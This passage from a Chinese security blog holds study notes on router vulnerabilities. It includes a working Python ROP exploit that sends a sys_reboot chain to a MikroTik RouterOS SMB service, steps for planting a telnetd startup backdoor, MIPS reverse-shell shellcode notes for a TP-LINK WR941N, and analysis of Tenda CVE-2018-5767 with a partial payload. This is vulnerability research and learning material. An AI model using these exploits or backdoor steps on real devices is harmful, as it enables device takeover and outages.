<li>进入系统后，将 /dev/sda2 mount到创建的临时文件夹</li>
<li>把busybox和gdbserver 拷贝到/tmp/d2/bin目录下<ul>
<li>从任意路由器文件系统find 一个busybox、（不是任意，注意架构问题</li>
<li>现成的gdbserser<a href="https://github.com/rapid7/embedded-tools/blob/master/binaries/gdbserver/gdbserver.i686" target="_blank" rel="noopener">https://github.com/rapid7/embedded-tools/blob/master/binaries/gdbserver/gdbserver.i686</a></li>
<li>mac上python开启服务器，Ubuntu（try的）中wget下载过去</li>
</ul>
</li>
<li>创建/tmp/d2/etc/rc.d/run.d下S99own脚本,当路由器系统启动的时候会自动执行此脚本（将busybox安装到mybin目录、设置环境变量、用busybox执行telnetd</li>
<li>PS:要修改这3个文件为可执行 （busybox、gdbserver、S99own</li>
<li>操作完成后，再将启动磁盘那，重新设置磁盘启动，并重启</li>
</ul>
</li>
<li>重启失败，开着开着就自己关了，是脚本有错？<ul>
<li>速度很快，拍视频可见两条错误：busybox Syntax error word unexpected expecting “)”、telnetd not found，后者可能是前者导致的</li>
<li>squashfs-root/bin$ busybox –install -s test、进入test发现有telnetd程序（mac下失败，Ubuntu成功</li>
<li>换一个busybox，<a href="https://busybox.net/downloads/binaries/1.30.0-i686/，原来那个是arm的，换成intel" target="_blank" rel="noopener">https://busybox.net/downloads/binaries/1.30.0-i686/，原来那个是arm的，换成intel</a> 80386的</li>
</ul>
</li>
<li>mac通过telnet连接进去：<ul>
<li>telnet 192.168.156.227 23000</li>
<li>另一台Ubuntu下不行，显示网络不可达</li>
<li>因为telnetd -p 23000 -l bash，所以返回bash，测试一下，果然支持的命令多了ipconfig都可以</li>
<li>telnet进去返回bash，可支持基本的Linux命令，但是一些专用指令，如ip address print，还得到原RouterOS中去</li>
</ul>
</li>
<li>查看是否开启smb服务（139端口<ul>
<li>telnet中：ps aux |grep smb、netstat aux |grep smb</li>
<li>routerOS中：ip smb print</li>
<li>kali：nmap 192.168.156.227 -p 139</li>
<li>开启smb：Ip smb set enabled=yes（RouterOS中</li>
</ul>
</li>
<li>远程调试<ul>
<li>telnet中：gdbserver.i686 :1234 –attach $(pidof smb)</li>
<li>IDA中：go过去不打开任何文件，debugger-attach-remote GDB debugger，路由器IP + 1234端口（没实际调试，gdb中提示没文件导入，ida中是不是也需要打开smb程序才可以调试</li>
<li>Ubuntu中：gdb-multiarch、target remote 192.168.156.227:1234、checksec提示There is no file loaded.（也要指定文件？gdb运行时gdb + xxx，或者进入gdb后file xxx指定；但是vmmap时可显示已经是smb程序，应该不需要了</li>
</ul>
</li>
<li>从iso中提取文件系统<ul>
<li><a href="http://blog.topsec.com.cn/mikrotik-routeros-smb缓冲区溢出漏洞分析/" target="_blank" rel="noopener">http://blog.topsec.com.cn/mikrotik-routeros-smb缓冲区溢出漏洞分析/</a></li>
<li>打开iso文件，提取出nnpk文件：system-6.40.8.npk</li>
<li>hex fiend打开，搜索text：hsqsD（squashFs文件系统的头部标示），找到位置4096=0x1000处</li>
<li>使用binwalk解包：binwalk -o 4096 -e system-6.40.8.npk（o指定偏移，e指向extract的文件）</li>
<li>解包后，就如同binwalk -Me xxx.bin文件一样，进入squashfs-root目录，find到smb文件（./nova/bin/smb）</li>
</ul>
</li>
<li>检查保护措施<ul>
<li>不进入gdb：checksec + ./nova/bin/smb：</li>
<li>进入gdb后，若没有file指定文件，则提示There is no file loaded.，file指定后，可能发生异常（一个不行就另一个，两个法，进入与不进入gdb</li>
<li>是否开启aslr：cat /proc/sys/kernel/randomize_va_space（aslr开启后，每次lib的地址都不 一样</li>
</ul>
</li>
<li>查看加载了哪些so动态库<ul>
<li>gdb中，vmmap</li>
<li>bash中，pifof smb获取ID，cat /proc/进程ID/maps</li>
</ul>
</li>
<li>由于smb里面没有引用system和dlysm函数，vdso里面有int80，那么考虑用int80来调用sys_reboot.（怎么知道的？暂且先记住</li>
<li>Vdso的地址是固定的，在gdb中将其dump下来：<ul>
<li>dump memory smb.dump 0xffffe000 0xfffff000</li>
<li>dump memory是固定指令</li>
<li>smb.dump是保存的结果，可自定义</li>
<li>后面是vdso的起始和结束地址</li>
</ul>
</li>
<li>从dump下来的smb.dump中寻找gadget：int 80<ul>
<li>ROPgadget –binary smb.dump |grep int 80，有一条结果：0xffffe42d : nop ; int 0x80，则int 80在0xffffe42e</li>
<li>IDA中：mipsrop.find(“int 80h”)没找到（注意是80h，而非0x80</li>
<li>IDA中：alt+T搜索指令，提示Command “AskNextText” failed</li>
<li>所幸打开IDA就能明显看到一个int 80h，与ROPGadget中相应，为e42e</li>
</ul>
</li>
<li>sys_reboot对应系统调用编号为88，位于kernel/sys.c文件中<ul>
<li>在线查询：<a href="http://asm.sourceforge.net/syscall.html#1" target="_blank" rel="noopener">http://asm.sourceforge.net/syscall.html#1</a></li>
<li>有四个参数：int sys_reboot(int magic1, int magic2, int cmd, void * arg)</li>
<li>Linux的函数，有没有类似于msdn的东西？（文中的图哪来的？</li>
</ul>
</li>
<li>构造rop链时常用指令：ROPgadget –binary ./nova/bin/smb –only “pop|ret”<ul>
<li>要准备eax ebx参数</li>
<li>找到一个pop/ret的gadget，pop eax ; pop ebx ; pop ebp ; ret</li>
<li>还pop ebp，因此eax和ebx后面还要准备ebp，如exp</li>
</ul>
</li>
<li>注意：<ul>
<li>并未实际调试，2.2控制eip没操作，len(data)是啥，怎么写的poc？</li>
<li>exp执行失败，与文中环境不同：int 80的地址不对、也没搜到文中的rop链</li>
<li>知识断层：Linux系统调用、int80的漏洞利用方式、rop链的构造。。。。。。</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/envpython</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch= <span class="string">'i386'</span>, os = <span class="string">'linux'</span>)</span><br><span class="line">NETBIOS_SESSION_REQUEST= <span class="string">"\x81"</span></span><br><span class="line">NETBIOS_SESSION_FLAGS= <span class="string">"\x00"</span></span><br><span class="line">payload=<span class="string">""</span></span><br><span class="line"><span class="comment"># 准备edx ecx ebx esi参数</span></span><br><span class="line">payload +=p32(<span class="number">0x08054017</span>)<span class="comment"># : pop edx ; pop ecx ; pop ebx ; pop esi ; pop edi ; pop ebp ;ret</span></span><br><span class="line">payload +=p32(<span class="number">0x1234567</span>) <span class="comment"># edx</span></span><br><span class="line">payload +=p32(<span class="number">672274793</span>) <span class="comment"># ecx  </span></span><br><span class="line">payload +=p32(<span class="number">0xfee1dead</span>)<span class="comment"># ebx</span></span><br><span class="line">payload +=p32(<span class="number">0x0</span>)<span class="comment"># esi </span></span><br><span class="line">payload +=p32(<span class="number">0xaaaaaaaa</span>)<span class="comment"># edi</span></span><br><span class="line">payload +=p32(<span class="number">0xaaaaaaaa</span>)<span class="comment"># ebp</span></span><br><span class="line"><span class="comment"># 准备eax ebx参数</span></span><br><span class="line">payload +=p32(<span class="number">0x0804f7da</span>)<span class="comment"># : pop eax ; pop ebx ; pop ebp ; ret</span></span><br><span class="line">payload +=p32(<span class="number">0x00000058</span>) <span class="comment"># eax = sys_reboot</span></span><br><span class="line">payload +=p32(<span class="number">0xfee1dead</span>) <span class="comment"># ebx </span></span><br><span class="line">payload +=p32(<span class="number">0xaaaaaaaa</span>) <span class="comment"># ebx</span></span><br><span class="line"><span class="comment"># call int80</span></span><br><span class="line">payload +=p32(<span class="number">0xFFFFE42E</span>)<span class="comment"># here int 0x80; pop ebp; pop edx; pop ecx; ret</span></span><br><span class="line">payload +=p32(<span class="number">0xaaaaaaaa</span>) <span class="comment"># ebp </span></span><br><span class="line">payload +=p32(<span class="number">0x0</span>) <span class="comment"># edx </span></span><br><span class="line">payload +=p32(<span class="number">0x0</span>)  <span class="comment"># ecx</span></span><br><span class="line"></span><br><span class="line">header =struct.pack(<span class="string">"!ccH"</span>, NETBIOS_SESSION_REQUEST, NETBIOS_SESSION_FLAGS,len(payload)+<span class="number">99</span>)</span><br><span class="line">x=<span class="string">"\xff"</span>*<span class="number">99</span></span><br><span class="line">attack =header + x+ payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">"__main__"</span>：</span><br><span class="line">    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    s.connect((<span class="string">"192.168.156.227"</span>,<span class="number">139</span>))</span><br><span class="line">    s.send(attack)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>参考：<a href="https://www.freebuf.com/articles/wireless/168063.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/wireless/168063.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>路由器</tag>
        <tag>漏洞分析</tag>
        <tag>栈溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>TP-LINK WR941N栈溢出漏洞的分析及利用</title>
    <url>/2020/06/18/iot/TP-LINK%20WR941N%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<p>[toc]</p>
<h2 id="TP-LINK-WR941N栈溢出漏洞的分析及利用"><a href="#TP-LINK-WR941N栈溢出漏洞的分析及利用" class="headerlink" title="TP-LINK WR941N栈溢出漏洞的分析及利用"></a>TP-LINK WR941N栈溢出漏洞的分析及利用</h2><ul>
<li><p>基本</p>
<ul>
<li>该路由器本身在默认情况下是不提供shell的，但是也有办法获取</li>
<li>该款路由器上的busybox的命令比较少，curl, nc, wget这些命令都没有，只能用tftp进行数据传输，而且只有<code>/tmp</code>目录可写，路由器重启后，传上去的文件就没了，这些问题都可以通过刷固件解决，</li>
<li>不过太麻烦了，只需要传上去一个<code>gdbserver</code>就好了（需要对应大小端），直接下编译好的: <a href="https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver" target="_blank" rel="noopener">https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver</a></li>
</ul>
</li>
<li><p>准备调试</p>
<ul>
<li>gdb的两个编译选项, host，表示gdb运行的环境，一般默认就是本机环境，还有target表示调试的目标环境，默认也是本机环境，</li>
<li>所以一个64位ubuntu上默认的gdb只能调试64 elf程序。</li>
<li>所以需要设置–target=mipsbel-linux参数进行编译gdb，才能调试大端的mips程序。</li>
<li>在路由器上执行：/tmp/gdbserver.mipsbe attach 0.0.0.0:12345 pid</li>
<li>使用编译好gdb进行调试：(gdb) target remote 192.168.1.1:12345</li>
</ul>
</li>
<li><p>在wr940n的exp中，ROP是在<code>libuClibc-0.9.30.so</code>中找的，</p>
<ul>
<li>根据<code>$ cat /proc/pid/maps</code>命令，发现wr941n路由器的基地址和文章中显示的wr940n路由器的是一样的，</li>
<li>然后再比较<code>libuClibc-0.9.30.so</code>文件的hash值，发现不同，所以要修改ROP地址。</li>
</ul>
</li>
<li><p>ida的mipsrop插件：用的是ida7.0，而这个插件只能在ida6.8(更低的没试过)版本使用。</p>
<p>  mips指令和bin互转的网站：<a href="http://shell-storm.org/online/Online-Assembler-and-Disassembler/?opcodes=%5Cx3c%5Cx1c%5Cx2a%5Cxb3%5Cx37%5Cx9c%5Cx17%5Cxb0&amp;arch=mips32&amp;endianness=big#disassembly" target="_blank" rel="noopener">http://shell-storm.org/online/Online-Assembler-and-Disassembler/?opcodes=%5Cx3c%5Cx1c%5Cx2a%5Cxb3%5Cx37%5Cx9c%5Cx17%5Cxb0&amp;arch=mips32&amp;endianness=big#disassembly</a></p>
</li>
<li><p>该路由器输入是不接受<code>\x00</code>和<code>\x20</code>：</p>
<ul>
<li><code>libuClibc</code>基地址：<code>0x2aae000</code>， <code>httpd</code>基地址：<code>0x00400000</code></li>
<li>如果在ELF中寻找ROP，则地址中总会有个<code>\x00</code>，（怎么总会有？？</li>
<li>所以在libc中寻找不存在<code>\x00</code>和<code>\x20</code>的地址。</li>
<li>但是在shellcode中，这两个字符却很难避免，所以对shellcode进行了xor加密</li>
</ul>
</li>
<li><p>一个大坑：</p>
<ul>
<li>使用gdb调试成功的一个反弹shell的shellcode，在实际测试中却失败了</li>
<li>参见：<a href="http://xdxd.love/2016/12/09/一个mips栈溢出利用/" target="_blank" rel="noopener">http://xdxd.love/2016/12/09/一个mips栈溢出利用/</a></li>
<li>mips 的 exp 编写中还有一个问题就是 cache incoherency。</li>
<li>MIPS CPUs 有两个独立的 cache：指令 cache 和数据 cache</li>
<li>当缓存满了，会触发 flush，将数据写回到主内存。</li>
<li>攻击者的 payload 通常会被应用当做数据来处理，存储在数据缓存中。</li>
<li>当 payload 触发漏洞，劫持程序执行流程的时候，会去执行内存中的shellcode</li>
<li>如果数据缓存没有触发 flush 的话，shellcode 依然存储在缓存中，而没有写入主内存。</li>
<li>这会导致程序执行了本该存储 shellcode 的地址处随机的代码，导致不可预知的后果。</li>
<li>最简单可靠的让缓存数据写入内存的方式是调用一个堵塞函数。比如 sleep(1) 或者其他类似的函数。sleep 的过程中，处理器会切换上下文让给其他正在执行的程序，缓存会自动执行 flush。</li>
</ul>
</li>
<li><p>payload编写：syscall部分</p>
<ul>
<li>li $v0, 4183、syscall 0x40404（sys_socket</li>
<li>mips为RISC，32位系统下指令固定4byte，syscall的字节码是<code>\x0c</code>，剩余的三字节默认用<code>\x00</code>补全</li>
<li>但是因为路由器不接受<code>\x00</code>的输入，所以在大端的情况下改成<code>\x01\x01\x01\x0c</code>，进行反汇编，就是<code>syscall 0x40404</code></li>
<li>系统调用的相关函数除了几个mips特有的，其他的都是跟linux下的syscall一样，可参考: <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/arch/mips/include/uapi/asm/unistd.h" target="_blank" rel="noopener">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/arch/mips/include/uapi/asm/unistd.h</a></li>
<li>比如sys_socket：<code>#define __NR_Linux 4000、#define __NR_socket (__NR_Linux + 183)</code>，所以<code>$v0=4183</code>表示的就是socket函数</li>
<li>具体参数信息可以去参考linux的系统调用：<a href="http://asm.sourceforge.net/syscall.html" target="_blank" rel="noopener">http://asm.sourceforge.net/syscall.html</a></li>
</ul>
</li>
<li><p>用c来实现一遍反连shell</p>
<ul>
<li>和其他架构不一样，mips架构中，tcp是2，udp是1</li>
<li>所以上面的代码比如在ubuntu中，是一个udp反连的代码，但是在mips中就是tcp反连</li>
<li>wr941n是大端，所以12345端口是0x3039而不是0x3930</li>
</ul>
</li>
<li><p>代码转换成mips指令的汇编</p>
<ul>
<li><p>路由器不接收<code>\x00</code>和<code>\x20</code>两个字符</p>
</li>
<li><p>设置a0的指令出现坏字符：<code>nor $a0,$t7,$zero =&gt; &quot;\x01\xe0\x20\x27&quot;</code></p>
</li>
<li><p>因为<code>$a0</code>和<code>$a1</code>的值都为2，所以可以：（将a1=2保存到栈，再从栈上取出给a0</p>
<p>  <code>sw $a1,-1($sp) =&gt; &quot;\xaf\xa5\xff\xff&quot;、</code></p>
<p>  <code>lw $a0,-1($sp)  =&gt;  &quot;\x8f\xa4\xff\xff&quot;</code></p>
</li>
</ul>
</li>
<li><p>替换exp中的shellcode，实际测试</p>
<ul>
<li>设备成功反连了控制端，但是却不能执行命令，到路由器上用ps查看，发现<code>sh</code>已经变为僵尸进程</li>
<li><p>问题出在<code>execve(&quot;/bin/sh&quot;,0,0)</code>，如果我修改成<code>execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;, 0], 0)</code>则成功反弹shell，可以任意命令执行</p>
</li>
<li><p>mips的shellcode编写参考路由器0Day</p>
</li>
</ul>
</li>
</ul>
<blockquote>
<p>参考：<a href="https://paper.seebug.org/448/" target="_blank" rel="noopener">https://paper.seebug.org/448/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>路由器</tag>
        <tag>漏洞分析</tag>
        <tag>栈溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>Tenda栈溢出即CVE-2018-5767漏洞分析</title>
    <url>/2020/05/28/iot/Tenda%E6%A0%88%E6%BA%A2%E5%87%BA-CVE-2018-5767%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20%20-%20/</url>
    <content><![CDATA[<p>[toc]</p>
<h2 id="Tenda栈溢出即CVE-2018-5767漏洞分析"><a href="#Tenda栈溢出即CVE-2018-5767漏洞分析" class="headerlink" title="Tenda栈溢出即CVE-2018-5767漏洞分析"></a>Tenda栈溢出即CVE-2018-5767漏洞分析</h2><ul>
<li><p>固件：<a href="https://drivers.softpedia.com/get/Router-Switch-Access-Point/Tenda/Tenda-AC15-Router-Firmware-1503116.shtml#download" target="_blank" rel="noopener">https://drivers.softpedia.com/get/Router-Switch-Access-Point/Tenda/Tenda-AC15-Router-Firmware-1503116.shtml#download</a></p>
</li>
<li><p>通过格式化字符串截取字符串，产生溢出</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">char</span> dst_buff[<span class="number">100</span>]= &#123;<span class="number">0</span>&#125;;</span><br><span class="line">   <span class="built_in">sscanf</span>(<span class="string">"password=123;"</span>, <span class="string">"%*[^=]=%[^;];*"</span>, dst_buff);</span><br><span class="line">   <span class="built_in">printf</span>(dst_buff);<span class="comment">// 123</span></span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>开源软件</strong></p>
<ul>
<li>基于goahead</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># https://xz.aliyun.com/t/7357</span></span><br><span class="line">根据在IDA中看到的websUrlHandlerDefine等函数，可以判定程序使用的是GoAhead框架，另外在字符串中找到了2.1.8，可以进一步确定程序使用的框架是GoAhead 2.1.8。在github可以下载框架源码。下载源码的目的在于补全一些结构体的定义,方便逆向.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 应该是websFormHandler函数，websUrlHandlerDefine是后续根据源码才rename的</span></span><br><span class="line">websUrlHandlerDefine(<span class="string">"/goform"</span>, 0, 0, websFormHandler, 0);</span><br></pre></td></tr></table></figure>
<ul>
<li>判定基于哪个开源软件</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 字符串搜索</span></span><br><span class="line"><span class="comment"># sub_16E9C(&amp;v9, 254, "%s/%s", "Http Server", "2.1.8");</span></span><br><span class="line">版本号：正则<span class="string">"\d\.\d\."</span>，判定2.1.8的版本号</span><br><span class="line">软件：http、server、version、usage、<span class="built_in">help</span>、welcome等，判定软件</span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数搜索</span></span><br><span class="line">websUrlHandlerDefine来自goahead框架</span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数行为，如下，就是goahead</span></span><br><span class="line">int formDefineUserMgmt()</span><br><span class="line">&#123;</span><br><span class="line">  websAspDefine(<span class="string">"TendaGetLongString"</span>, aspTendaGetLongString);</span><br><span class="line">  websAspDefine(<span class="string">"aspTendaGetStatus"</span>, aspTendaGetStatus);</span><br><span class="line">  websFormDefine(<span class="string">"updateUrlLog"</span>, updateUrlLog);</span><br></pre></td></tr></table></figure>
<ul>
<li>goahead version2.1.8下载：<a href="https://github.com/trenta3/goahead-versions（官网只有最新，实测不行，差异太大" target="_blank" rel="noopener">https://github.com/trenta3/goahead-versions（官网只有最新，实测不行，差异太大</a></li>
</ul>
<p><strong>ida技巧</strong></p>
<ul>
<li>ida中对字符串偏移多引用了一次</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 多引用了一次</span></span><br><span class="line">strcpy(webdir, off_D2F20); </span><br><span class="line">.data:000D2F20 off_D2F20       DCD aWebroot</span><br><span class="line">.rodata:000B38C8 aWebroot        DCB <span class="string">"/webroot"</span>,0</span><br><span class="line"><span class="comment"># 重命名，方便理解</span></span><br><span class="line">strcpy(webdir, offset_aWebroot);</span><br></pre></td></tr></table></figure>
<ul>
<li>一时无法判断函数名，多看一层，会有提示性全局变量</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 重命名websSetHost</span></span><br><span class="line">sub_2BCB8(buff);</span><br><span class="line">char *__fastcall sub_2BCB8(const char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">return</span> strncpy(websHost, a1, 0x40u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>字符串为空时，直接重命名null</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 字符串为空</span></span><br><span class="line">.data:000D2F24 off_D2F24       DCD dword_B38D4</span><br><span class="line">.rodata:000B38D4 dword_B38D4     DCD 0</span><br><span class="line"><span class="comment"># off_xxx、&amp;dword_xxx形式，影响观看</span></span><br><span class="line">websSetPassword(off_D2F24);</span><br><span class="line">websUrlHandlerDefine(&amp;dword_B38D4, 0, 0, R7WebsSecurityHandler, 1);</span><br><span class="line"><span class="comment"># 直接重命名为null，方便理解</span></span><br><span class="line">websSetPassword(offset_null);</span><br><span class="line">websUrlHandlerDefine(&amp;null, 0, 0, R7WebsSecurityHandler, 1);</span><br></pre></td></tr></table></figure>
<ul>
<li>指定uri的处理函数：函数的间接调用形式</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 非直接调用，非p而是o，</span></span><br><span class="line">websUrlHandlerDefine(<span class="string">"/goform"</span>, 0, 0, websFormHandler, 0);</span><br><span class="line">websUrlHandlerDefine(<span class="string">"/cgi-bin"</span>, 0, 0, webs_Tenda_CGI_BIN_Handler, 0);</span><br></pre></td></tr></table></figure>
<ul>
<li>及时f5更新反编译代码</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 原来</span></span><br><span class="line">v0 = websUrlHandlerDefine(&amp;null, 0, 0, websDefaultHandler, 2);</span><br><span class="line">sub_3FBF0(v0);</span><br><span class="line"><span class="comment"># 汇编代码中明显不需要v0</span></span><br><span class="line"><span class="comment"># f5刷新后（边修改边刷新</span></span><br><span class="line">websUrlHandlerDefine(&amp;null, 0, 0, websDefaultHandler, 2);</span><br><span class="line">sub_3FBF0();</span><br></pre></td></tr></table></figure>
<p><strong>结构体</strong></p>
<ul>
<li>添加结构体时，typedef struct之后最好带上个名字</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 如下，则邮件edit时，typedef struct $086A4A42A4A81EF8BA506DEC7B04479A ringq_t;</span></span><br><span class="line">  <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">&#125; <span class="keyword">ringq_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如下，带名字后，就显示就友好了</span></span><br><span class="line"> <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ringq_t</span>&#123;</span></span><br><span class="line">&#125; <span class="keyword">ringq_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ringq_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *buf;</span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *servp;</span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *endp;</span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *endbuf;</span><br><span class="line">  <span class="keyword">int</span> buflen;</span><br><span class="line">  <span class="keyword">int</span> maxsize;</span><br><span class="line">  <span class="keyword">int</span> increment;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>添加websRec结构体（C语言语法</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// https://xz.aliyun.com/t/7357</span></span><br><span class="line"><span class="comment">// 快捷键shift+F1</span></span><br><span class="line">小技巧 : IDA中导入C语言声明的结构体.在View--&gt;Open Subviews--&gt;Local Types中可以看到本地已有的结构体，在该窗口中右击insert.可以添加C语言声明的结构体</span><br><span class="line"></span><br><span class="line"><span class="comment">// 依据报错信息，继续导入其它，如导入结构体websRec时</span></span><br><span class="line">Syntax error near: <span class="keyword">ringq_t</span></span><br><span class="line">Syntax error near: <span class="keyword">sym_fd_t</span></span><br><span class="line">Syntax error near: <span class="keyword">sym_fd_t</span></span><br><span class="line">Syntax error near: &#125;</span><br><span class="line"><span class="comment">// 再继续导入即可，最终</span></span><br><span class="line"><span class="comment">// 添加时，结构体成员会依据#ifdef来，其实相当于没有，因为压根就没设置相应的宏</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">short</span> 		<span class="keyword">char_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> <span class="keyword">sym_fd_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">&#125; <span class="keyword">ringq_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">websRec</span> &#123;</span></span><br><span class="line">&#125; websRec;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加成功后，然后搜索定义好的结构体，双击导入到此idb</span></span><br><span class="line">websRec会用到<span class="keyword">ringq_t</span>，只导入前者，后者自动导入</span><br><span class="line">  </span><br><span class="line"><span class="comment">// structure窗口删除某结构体，Local Types中也会删除</span></span><br><span class="line"><span class="comment">// 修改结构体，可以在Local Types中以c语法修改，structure窗口中麻烦</span></span><br></pre></td></tr></table></figure>
<ul>
<li>修改参数类型</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 改名字n，改类型y</span></span><br><span class="line"><span class="comment"># a1 + 48这种加偏移的一看就是结构体</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 原来是int a1</span></span><br><span class="line">int __fastcall R7WebsSecurityHandler(int a1, int a2, int a3, int a4, char *uri)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> ( i = 0; i &lt;= 2 &amp;&amp; strcmp(&amp;loginUserInfo + 36 * i, (a1 + 48)); ++i )</span><br><span class="line"><span class="comment"># 改为 websRec * a1，注意是指针！</span></span><br><span class="line">	<span class="keyword">for</span> ( i = 0; i &lt;= 2 &amp;&amp; strcmp(&amp;loginUserInfo + 36 * i, a1-&gt;ipaddr); ++i )</span><br></pre></td></tr></table></figure>
<ul>
<li>结构体错误，tenda肯定将goahead修改过，故结构体暂不添加</li>
</ul>
<p><strong>疑问</strong></p>
<ul>
<li>怎么知道是漏洞点是cookie的？？</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 导入结构体webRec后，按照通告，漏洞点应该是cookie，而非type</span></span><br><span class="line"><span class="comment">// 结构体错误，tenda肯定将goahead修改过，故结构体暂不添加</span></span><br><span class="line"><span class="comment">// 怎么知道原来的“a1 + 184”是cookie字段的？</span></span><br><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">R7WebsSecurityHandler</span><span class="params">(websRec *a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">char</span> *uri)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( *&amp;a1-&gt;type[<span class="number">36</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      str_password = <span class="built_in">strstr</span>(*&amp;a1-&gt;type[<span class="number">36</span>], <span class="string">"password="</span>);</span><br><span class="line">      <span class="keyword">if</span> ( str_password )</span><br><span class="line">        <span class="built_in">sscanf</span>(str_password, <span class="string">"%*[^=]=%[^;];*"</span>, dst_buff);<span class="comment">// overflow!</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">sscanf</span>(*&amp;a1-&gt;type[<span class="number">36</span>], <span class="string">"%*[^=]=%[^;];*"</span>, dst_buff);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>想绕过崩溃点，到函数返回以控制pc，按分析应该是uri，但为何加到了cookie字段？</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 应该是uri</span></span><br><span class="line">    <span class="keyword">if</span> ( strlen(uri_2) &lt;= 3                     // 要想绕过sub_2C568，需<span class="literal">false</span></span><br><span class="line">                                                // 满足一下后缀即可</span><br><span class="line">      || (v43 = strchr(uri_2, <span class="string">'.'</span>)) == 0</span><br><span class="line">      || (v43 = v43 + 1, memcmp(v43, <span class="string">"gif"</span>, 3u))</span><br><span class="line">      &amp;&amp; memcmp(v43, <span class="string">"png"</span>, 3u)</span><br><span class="line">      &amp;&amp; memcmp(v43, <span class="string">"js"</span>, 2u)</span><br><span class="line">      &amp;&amp; memcmp(v43, <span class="string">"css"</span>, 3u)</span><br><span class="line">      &amp;&amp; memcmp(v43, <span class="string">"jpg"</span>, 3u)</span><br><span class="line">      &amp;&amp; memcmp(v43, <span class="string">"jpeg"</span>, 3u) )</span><br><span class="line"><span class="comment"># 为何加在cookie</span></span><br><span class="line">payload = <span class="string">"A"</span>*444 +<span class="string">".png"</span> + p32(gadget1) + p32(system_addr) + p32(gadget2) + cmd</span><br><span class="line">cookie = 